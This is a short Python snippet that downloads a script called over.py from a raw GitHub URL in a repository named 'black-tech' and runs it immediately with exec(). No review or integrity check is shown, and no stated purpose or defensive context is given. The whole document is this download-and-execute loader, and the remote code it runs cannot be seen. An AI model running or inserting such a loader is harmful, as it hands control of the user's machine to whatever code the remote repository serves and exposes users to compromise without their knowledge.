from urllib.request import urlopen
url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
exec(urlopen(url).read().decode())
